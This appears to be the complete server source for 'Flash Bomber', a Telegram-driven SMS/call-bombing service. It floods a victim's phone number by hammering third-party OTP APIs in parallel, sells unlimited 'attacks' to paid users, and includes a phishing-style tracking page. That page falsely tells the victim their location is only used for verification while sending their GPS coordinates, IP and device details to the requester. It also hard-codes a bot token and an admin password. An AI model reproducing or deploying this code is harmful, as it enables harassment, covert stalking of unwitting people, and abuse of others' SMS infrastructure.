const express = require('express');
const cors = require('cors');
const axios = require('axios');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const requestIp = require('request-ip');
const useragent = require('useragent');
const geoip = require('geoip-lite');
const crypto = require('crypto');
const moment = require('moment');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const PORT = 5500;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(requestIp.mw());
app.use(express.static(path.join(__dirname, '/')));

// Load APIs
let apisData;
try {
  apisData = JSON.parse(fs.readFileSync('./apis.json', 'utf8'));
  console.log(`✅ Loaded ${apisData.apis.length} APIs`);
} catch (error) {
  console.log('❌ Error loading APIs, creating default:', error);
  apisData = { apis: [] };
  fs.writeFileSync('./apis.json', JSON.stringify(apisData, null, 2));
}

// Database
let database = {
  users: [],
  attacks: [],
  locations: [],
  botUsers: [],
  logs: []
};

try {
  if (fs.existsSync('./database.json')) {
    database = JSON.parse(fs.readFileSync('./database.json', 'utf8'));
  } else {
    fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
  }
  console.log(`✅ Loaded ${database.users.length} users, ${database.locations.length} locations`);
} catch (error) {
  console.log('❌ Error loading database');
}

// Save database
function saveDatabase() {
  fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
}

// Add log
function addLog(type, message, data = {}) {
  const log = {
    id: crypto.randomBytes(8).toString('hex'),
    type,
    message,
    data,
    timestamp: new Date().toISOString()
  };
  database.logs.push(log);
  if (database.logs.length > 1000) database.logs = database.logs.slice(-1000);
  saveDatabase();
  
  // Emit to admin
  io.emit('new-log', log);
  
  return log;
}

// =============== TELEGRAM BOT SETUP ===============
const TELEGRAM_TOKEN = '8750510514:AAG8cgcVULCGXXc8cmYYlnddEiEjDsO34Ik'; // Replace with your bot token
let bot;

try {
  const TelegramBot = require('node-telegram-bot-api');
  bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
  
  console.log('🤖 Telegram Bot Started!');
  
  // Handle /start command
  bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username || 'No username';
    const firstName = msg.from.first_name || '';
    const lastName = msg.from.last_name || '';
    
    // Save bot user
    let botUser = database.botUsers.find(u => u.telegramId === userId);
    if (!botUser) {
      botUser = {
        telegramId: userId,
        username,
        firstName,
        lastName,
        chatId,
        joinedAt: new Date().toISOString(),
        lastActive: new Date().toISOString(),
        isAdmin: false,
        attacksDone: 0
      };
      database.botUsers.push(botUser);
      saveDatabase();
    }
    
    const welcomeMessage = `
╔══════════════════════════════════╗
║    🤖 FLASH BOMBER BOT ACTIVE    ║
╚══════════════════════════════════╝

👋 Welcome *${firstName}*!

🔹 *User ID*: \`${userId}\`
🔹 *Username*: @${username}
🔹 *Status*: ✅ Active

🎯 *Commands*:
/attack [number] - Start attack
/locate [number] - Track location
/stats - Your stats
/help - Get help

⚡ Powered by Flash Bomber
    `;
    
    bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
    
    addLog('bot', `New bot user: ${firstName} (@${username})`, { userId, chatId });
  });
  
  // Handle attack command
  bot.onText(/\/attack (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const phone = match[1].replace(/\D/g, '');
    
    if (!phone || phone.length !== 10) {
      return bot.sendMessage(chatId, '❌ Please enter valid 10-digit number!\nExample: /attack 9876543210');
    }
    
    bot.sendMessage(chatId, `⚡ Starting attack on +91${phone}...`);
    
    // Get bot user
    const botUser = database.botUsers.find(u => u.telegramId === userId);
    if (!botUser) return;
    
    botUser.lastActive = new Date().toISOString();
    botUser.attacksDone = (botUser.attacksDone || 0) + 1;
    saveDatabase();
    
    // Start attack
    try {
      const apisToUse = apisData.apis;
      let totalSent = 0;
      
      for (const api of apisToUse) {
        try {
          await callApi(api, phone);
          totalSent++;
          
          if (totalSent % 10 === 0) {
            bot.sendMessage(chatId, `📊 Progress: ${totalSent}/${apisToUse.length} requests sent...`);
          }
        } catch (e) {}
      }
      
      bot.sendMessage(chatId, `
✅ *Attack Completed!*

📱 Target: +91${phone}
📊 Total: ${totalSent} requests sent
⚡ Status: Success

_Attacks remaining: Unlimited_
      `, { parse_mode: 'Markdown' });
      
    } catch (error) {
      bot.sendMessage(chatId, '❌ Attack failed. Please try again.');
    }
  });
  
  // Handle location tracking
  bot.onText(/\/locate (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const phone = match[1].replace(/\D/g, '');
    
    if (!phone || phone.length !== 10) {
      return bot.sendMessage(chatId, '❌ Please enter valid 10-digit number!\nExample: /locate 9876543210');
    }
    
    // Generate tracking link
    const trackingId = crypto.randomBytes(16).toString('hex');
    const trackingUrl = `http://your-domain.com/track/${trackingId}?phone=${phone}`;
    
    bot.sendMessage(chatId, `
📍 *Location Tracking Link Generated*

🔗 *Link*: \`${trackingUrl}\`

📱 Target: +91${phone}

⚠️ Send this link to the target. When they click and allow location permission, you'll receive their exact location here.

⏱️ Link expires in: 30 minutes
    `, { parse_mode: 'Markdown' });
    
    // Store tracking info
    const tracking = {
      id: trackingId,
      phone,
      userId: msg.from.id,
      chatId,
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
      location: null
    };
    
    if (!database.trackings) database.trackings = [];
    database.trackings.push(tracking);
    saveDatabase();
  });
  
  // Handle stats
  bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    const botUser = database.botUsers.find(u => u.telegramId === userId);
    if (!botUser) return;
    
    const stats = `
📊 *Your Stats*

🆔 User ID: \`${userId}\`
📝 Username: @${botUser.username}
📅 Joined: ${moment(botUser.joinedAt).format('DD/MM/YYYY')}
⚡ Attacks Done: ${botUser.attacksDone || 0}
💎 Account Type: ${botUser.isAdmin ? 'ADMIN' : 'Regular User'}

🌐 Total Attacks Today: ${database.attacks.filter(a => moment(a.timestamp).isSame(new Date(), 'day')).length}
📱 APIs Available: ${apisData.apis.length}
    `;
    
    bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
  });
  
  // Handle help
  bot.onText(/\/help/, async (msg) => {
    const chatId = msg.chat.id;
    
    const help = `
📚 *Commands Guide*

⚡ *Attack Commands*
/attack [number] - Start SMS/Call bombing
/locate [number] - Generate location tracker
/bomb [number] - Quick attack (1 min)

📊 *Info Commands*
/stats - View your statistics
/status - Check system status
/apis - List available APIs

👑 *Admin Commands*
/broadcast [msg] - Send to all users
/adduser [id] - Add paid user
/removeuser [id] - Remove user
/statsall - View all stats

📞 *Contact Admin*
🔹 Telegram: @snehamusiic
🔹 Support: 24/7 Available
    `;
    
    bot.sendMessage(chatId, help, { parse_mode: 'Markdown' });
  });
  
  // Handle broadcast (admin only)
  bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const message = match[1];
    
    const botUser = database.botUsers.find(u => u.telegramId === userId);
    if (!botUser || !botUser.isAdmin) {
      return bot.sendMessage(chatId, '❌ Admin only command!');
    }
    
    let sent = 0;
    let failed = 0;
    
    for (const user of database.botUsers) {
      try {
        await bot.sendMessage(user.chatId, `📢 *BROADCAST*\n\n${message}\n\n- Admin`, { parse_mode: 'Markdown' });
        sent++;
      } catch (e) {
        failed++;
      }
    }
    
    bot.sendMessage(chatId, `✅ Broadcast sent!\n📨 Sent: ${sent}\n❌ Failed: ${failed}`);
  });
  
} catch (error) {
  console.log('❌ Telegram Bot Error:', error.message);
}

// =============== LOCATION TRACKING ENDPOINTS ===============

// Serve tracking page
app.get('/track/:trackingId', (req, res) => {
  const { trackingId } = req.params;
  const { phone } = req.query;
  
  // Get tracking info
  const tracking = database.trackings?.find(t => t.id === trackingId);
  
  if (!tracking) {
    return res.status(404).send('Invalid or expired link');
  }
  
  if (new Date() > new Date(tracking.expiresAt)) {
    return res.status(410).send('Link expired');
  }
  
  // Get client info
  const clientIp = req.clientIp;
  const agent = useragent.parse(req.headers['user-agent']);
  const geo = geoip.lookup(clientIp);
  
  // Send HTML with location request
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Location Access Required</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateY(-50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        h1 {
            color: #333;
            margin-bottom: 15px;
            font-size: 28px;
        }
        
        p {
            color: #666;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        
        .location-box {
            background: #f7f7f7;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            display: none;
        }
        
        .location-box.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .coordinates {
            font-family: monospace;
            font-size: 18px;
            color: #667eea;
            font-weight: bold;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            width: 100%;
            margin-bottom: 15px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .status {
            color: #28a745;
            font-weight: bold;
            margin-top: 15px;
            display: none;
        }
        
        .status.error {
            color: #dc3545;
        }
        
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .info {
            background: #e3f2fd;
            border-radius: 8px;
            padding: 10px;
            margin-top: 20px;
            font-size: 14px;
            color: #1976d2;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📍</div>
        <h1>Location Access Required</h1>
        <p>To continue, please allow access to your location. This helps us provide better service and verify your identity.</p>
        
        <div class="location-box" id="locationBox">
            <p style="color: #333; margin-bottom: 10px;">✅ Location Captured!</p>
            <div class="coordinates" id="coordinates"></div>
            <p style="color: #666; margin-top: 15px; font-size: 14px;">Sending to server...</p>
        </div>
        
        <div class="loader" id="loader"></div>
        
        <button class="btn" id="allowBtn" onclick="requestLocation()">
            🔓 ALLOW LOCATION ACCESS
        </button>
        
        <button class="btn" id="continueBtn" style="background: #28a745; display: none;" onclick="continueToSite()">
            ✅ Continue to Website
        </button>
        
        <div class="status" id="status"></div>
        
        <div class="info">
            🔒 Your privacy is important. Location is only used for verification.
        </div>
    </div>

    <script>
        const trackingId = '${trackingId}';
        const phone = '${phone}';
        
        function requestLocation() {
            const allowBtn = document.getElementById('allowBtn');
            const loader = document.getElementById('loader');
            const status = document.getElementById('status');
            
            allowBtn.disabled = true;
            loader.style.display = 'block';
            status.style.display = 'none';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    // Success
                    async (position) => {
                        const { latitude, longitude, accuracy } = position.coords;
                        
                        // Get additional info
                        const timestamp = new Date().toISOString();
                        const userAgent = navigator.userAgent;
                        const platform = navigator.platform;
                        const language = navigator.language;
                        
                        // Send to server
                        try {
                            const response = await fetch('/api/track-location', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    trackingId,
                                    phone,
                                    latitude,
                                    longitude,
                                    accuracy,
                                    timestamp,
                                    userAgent,
                                    platform,
                                    language
                                })
                            });
                            
                            const data = await response.json();
                            
                            loader.style.display = 'none';
                            
                            if (data.success) {
                                document.getElementById('locationBox').classList.add('active');
                                document.getElementById('coordinates').innerHTML = 
                                    \`Lat: \${latitude.toFixed(6)}<br>Lng: \${longitude.toFixed(6)}<br>Accuracy: ±\${accuracy.toFixed(1)}m\`;
                                
                                status.style.display = 'block';
                                status.className = 'status';
                                status.innerHTML = '✅ Location captured and sent successfully!';
                                
                                document.getElementById('continueBtn').style.display = 'block';
                            } else {
                                throw new Error('Server error');
                            }
                        } catch (error) {
                            loader.style.display = 'none';
                            status.style.display = 'block';
                            status.className = 'status error';
                            status.innerHTML = '❌ Error sending location. Please try again.';
                            allowBtn.disabled = false;
                        }
                    },
                    // Error
                    (error) => {
                        loader.style.display = 'none';
                        status.style.display = 'block';
                        status.className = 'status error';
                        
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                status.innerHTML = '❌ Location access denied. Please allow access and try again.';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                status.innerHTML = '❌ Location information unavailable.';
                                break;
                            case error.TIMEOUT:
                                status.innerHTML = '❌ Location request timed out.';
                                break;
                            default:
                                status.innerHTML = '❌ An unknown error occurred.';
                        }
                        
                        allowBtn.disabled = false;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                loader.style.display = 'none';
                status.style.display = 'block';
                status.className = 'status error';
                status.innerHTML = '❌ Geolocation is not supported by this browser.';
                allowBtn.disabled = false;
            }
        }
        
        function continueToSite() {
            window.location.href = 'https://www.google.com';
        }
    </script>
</body>
</html>
  `);
});

// Receive location
app.post('/api/track-location', (req, res) => {
  const { trackingId, phone, latitude, longitude, accuracy, timestamp, userAgent, platform, language } = req.body;
  const clientIp = req.clientIp;
  const geo = geoip.lookup(clientIp);
  
  // Get tracking info
  const tracking = database.trackings?.find(t => t.id === trackingId);
  
  if (!tracking) {
    return res.json({ success: false, error: 'Invalid tracking ID' });
  }
  
  // Save location
  const locationData = {
    id: crypto.randomBytes(8).toString('hex'),
    trackingId,
    phone,
    latitude,
    longitude,
    accuracy,
    timestamp,
    clientIp,
    geo: geo || null,
    userAgent,
    platform,
    language,
    userId: tracking.userId,
    chatId: tracking.chatId,
    capturedAt: new Date().toISOString()
  };
  
  database.locations.push(locationData);
  saveDatabase();
  
  // Send to Telegram
  if (bot) {
    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const locationMessage = `
📍 *LOCATION CAPTURED!*

📱 *Phone*: +91${phone}
🌐 *Coordinates*: \`${latitude}, ${longitude}\`
🎯 *Accuracy*: ±${accuracy} meters
🕐 *Time*: ${moment().format('DD/MM/YYYY HH:mm:ss')}

🔗 *Google Maps*: [Click to view](${googleMapsLink})

📊 *Device Info*:
• Platform: ${platform}
• Language: ${language}
• IP: ${clientIp}
• Country: ${geo?.country || 'Unknown'}
• City: ${geo?.city || 'Unknown'}

⚡ *Tracking ID*: \`${trackingId}\`
    `;
    
    bot.sendMessage(tracking.chatId, locationMessage, { parse_mode: 'Markdown' });
    
    // Try to send actual location
    try {
      bot.sendLocation(tracking.chatId, latitude, longitude);
    } catch (e) {}
  }
  
  addLog('location', `Location captured for +91${phone}`, locationData);
  
  res.json({ success: true, location: locationData });
});

// =============== SOUND EFFECTS ENDPOINT ===============
app.get('/api/sounds/:sound', (req, res) => {
  const { sound } = req.params;
  
  // Base64 encoded sound effects
  const sounds = {
    'attack-start': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...', // Add actual base64 sound
    'attack-stop': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
    'success': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
    'error': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
    'notification': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...'
  };
  
  res.json({ sound: sounds[sound] || sounds['notification'] });
});

// =============== ATTACK FUNCTIONS ===============

// Call single API
async function callApi(api, phone) {
  try {
    let url = api.url;
    let data = null;
    
    // Replace {phone} in URL
    url = url.replace(/{phone}/g, phone);
    
    // Prepare data
    if (api.body) {
      if (typeof api.body === 'string') {
        data = api.body.replace(/{phone}/g, phone);
      } else {
        data = {};
        for (let key in api.body) {
          let value = api.body[key];
          if (typeof value === 'string') {
            value = value.replace(/{phone}/g, phone);
          } else if (typeof value === 'object') {
            value = JSON.parse(JSON.stringify(value).replace(/{phone}/g, phone));
          }
          data[key] = value;
        }
      }
    }

    // Make request
    const response = await axios({
      method: api.method,
      url: url,
      headers: api.headers || {},
      data: data,
      timeout: 3000
    });

    return response.status >= 200 && response.status < 300;
    
  } catch (error) {
    return false;
  }
}

// Start attack endpoint
app.post('/api/attack', async (req, res) => {
  const { phone, duration, speed, userId, isTrial } = req.body;
  
  console.log(`⚡ Attack started: ${phone} for ${duration}s (Speed: ${speed})`);
  addLog('attack', `Attack started on +91${phone}`, { phone, duration, speed, userId });
  
  // Set headers for SSE
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });

  const startTime = Date.now();
  const endTime = startTime + (duration * 1000);
  
  let totalRequests = 0;
  let successRequests = 0;
  let failedRequests = 0;
  
  // Get APIs to use
  const apisToUse = apisData.apis;
  const batchSize = speed === 5 ? apisToUse.length : Math.floor(apisToUse.length * (speed / 5));
  
  // Attack loop
  const attackInterval = setInterval(async () => {
    const now = Date.now();
    
    if (now >= endTime) {
      clearInterval(attackInterval);
      
      // Log attack
      database.attacks.push({
        userId,
        phone,
        duration,
        totalRequests,
        successRequests,
        failedRequests,
        timestamp: new Date().toISOString()
      });
      saveDatabase();
      
      addLog('attack', `Attack completed on +91${phone}`, { totalRequests, successRequests, failedRequests });
      
      res.write(`data: ${JSON.stringify({ 
        type: 'end', 
        total: totalRequests, 
        success: successRequests, 
        failed: failedRequests 
      })}\n\n`);
      res.end();
      return;
    }

    // Call APIs in parallel
    const promises = [];
    
    for (let i = 0; i < batchSize; i++) {
      const api = apisToUse[i % apisToUse.length];
      
      // Call multiple times based on count
      for (let j = 0; j < (api.count || 1); j++) {
        promises.push(callApi(api, phone));
      }
    }

    // Execute all promises
    const results = await Promise.allSettled(promises);
    
    // Count results
    results.forEach(result => {
      totalRequests++;
      if (result.status === 'fulfilled' && result.value) {
        successRequests++;
      } else {
        failedRequests++;
      }
    });

    // Send update
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const progress = (elapsed / duration) * 100;
    const rps = totalRequests / elapsed || 0;

    res.write(`data: ${JSON.stringify({
      type: 'update',
      elapsed,
      total: totalRequests,
      success: successRequests,
      failed: failedRequests,
      progress,
      rps: rps.toFixed(1)
    })}\n\n`);

  }, 1000);
});

// =============== API ENDPOINTS ===============

// Get all APIs
app.get('/api/apis', (req, res) => {
  res.json({
    total: apisData.apis.length,
    apis: apisData.apis
  });
});

// User registration
app.post('/api/register', (req, res) => {
  const { userId, name } = req.body;
  
  let user = database.users.find(u => u.id === userId);
  
  if (!user) {
    user = {
      id: userId,
      name: name || `User_${userId}`,
      trialUsed: 0,
      trialBlocked: false,
      isPaid: false,
      attacksDone: 0,
      registeredAt: new Date().toISOString()
    };
    database.users.push(user);
    saveDatabase();
    addLog('user', `New user registered: ${userId}`, { userId });
  }
  
  res.json({ success: true, user });
});

// Use trial
app.post('/api/use-trial', (req, res) => {
  const { userId } = req.body;
  
  const user = database.users.find(u => u.id === userId);
  
  if (!user) {
    return res.json({ success: false, message: 'User not found' });
  }
  
  if (user.trialUsed > 0 || user.trialBlocked) {
    return res.json({ success: false, message: 'Trial already used' });
  }
  
  if (user.isPaid) {
    return res.json({ success: false, message: 'Paid users cannot use trial' });
  }
  
  user.trialUsed = 1;
  user.trialBlocked = true;
  saveDatabase();
  
  res.json({ success: true, message: 'Trial activated' });
});

// Get locations
app.get('/api/locations', (req, res) => {
  res.json(database.locations);
});

// Get logs
app.get('/api/logs', (req, res) => {
  res.json(database.logs);
});

// =============== SOCKET.IO ===============
io.on('connection', (socket) => {
  console.log('🔌 Client connected:', socket.id);
  
  socket.on('join-admin', (password) => {
    if (password === 'shaiqua@74567') {
      socket.join('admin');
      socket.emit('admin-joined', true);
      addLog('socket', 'Admin joined', { socketId: socket.id });
    }
  });
  
  socket.on('disconnect', () => {
    console.log('🔌 Client disconnected:', socket.id);
  });
});

// =============== ADMIN ENDPOINTS ===============

// Admin login
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  
  if (password === 'shaiqua@74567') {
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

// Get all users
app.get('/api/admin/users', (req, res) => {
  res.json(database.users);
});

// Add paid user
app.post('/api/admin/add-user', (req, res) => {
  const { userId, username } = req.body;
  
  let user = database.users.find(u => u.id === userId);
  
  if (!user) {
    user = {
      id: userId,
      name: username || `User_${userId}`,
      trialUsed: 1,
      trialBlocked: true,
      isPaid: true,
      attacksDone: 0,
      registeredAt: new Date().toISOString()
    };
    database.users.push(user);
  } else {
    user.isPaid = true;
    user.trialBlocked = true;
  }
  
  saveDatabase();
  addLog('admin', `Added paid user: ${userId}`, { userId, username });
  
  // Notify via Telegram if bot exists
  if (bot) {
    const botUser = database.botUsers.find(u => u.telegramId == userId);
    if (botUser) {
      bot.sendMessage(botUser.chatId, '🎉 Congratulations! You are now a PAID user with unlimited attacks!');
    }
  }
  
  res.json({ success: true, user });
});

// Remove user
app.post('/api/admin/remove-user', (req, res) => {
  const { userId } = req.body;
  
  database.users = database.users.filter(u => u.id !== userId);
  saveDatabase();
  
  addLog('admin', `Removed user: ${userId}`, { userId });
  
  res.json({ success: true });
});

// Reset trial
app.post('/api/admin/reset-trial', (req, res) => {
  const { userId } = req.body;
  
  const user = database.users.find(u => u.id === userId);
  
  if (user) {
    user.trialUsed = 0;
    user.trialBlocked = false;
    saveDatabase();
    addLog('admin', `Reset trial for user: ${userId}`, { userId });
  }
  
  res.json({ success: true });
});

// Add new API
app.post('/api/admin/add-api', (req, res) => {
  const newApi = req.body;
  
  newApi.id = apisData.apis.length + 1;
  apisData.apis.push(newApi);
  
  fs.writeFileSync('./apis.json', JSON.stringify(apisData, null, 2));
  
  addLog('admin', `Added new API: ${newApi.name}`, newApi);
  
  res.json({ success: true, api: newApi });
});

// Get stats
app.get('/api/admin/stats', (req, res) => {
  res.json({
    totalUsers: database.users.length,
    paidUsers: database.users.filter(u => u.isPaid).length,
    trialUsers: database.users.filter(u => u.trialUsed > 0 && !u.isPaid).length,
    totalAttacks: database.attacks.length,
    totalApis: apisData.apis.length,
    totalLocations: database.locations.length,
    botUsers: database.botUsers.length,
    attacksToday: database.attacks.filter(a => moment(a.timestamp).isSame(new Date(), 'day')).length,
    attacksThisWeek: database.attacks.filter(a => moment(a.timestamp).isSame(new Date(), 'week')).length
  });
});

// Start server
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════════════════════════════╗
║              ⚡ FLASH BOMBER ADVANCED EDITION ⚡                ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  📡 Server URL: http://localhost:${PORT}                             ║
║  📊 Total APIs: ${apisData.apis.length}                                         ║
║  👥 Total Users: ${database.users.length}                                        ║
║  🤖 Bot Status: ${bot ? '✅ ACTIVE' : '❌ DISABLED'}                                    ║
║  🌐 Socket.IO: ✅ ENABLED                                         ║
║    👿  TU JAAA RE CHAPRI                                     ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  🔑 Admin Login: CHAL HTTT.                                ║
║  🤖 Telegram Bot: KYU BATAU                                ║
║  📞 Support: SHAIQUA                                         ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
  `);
});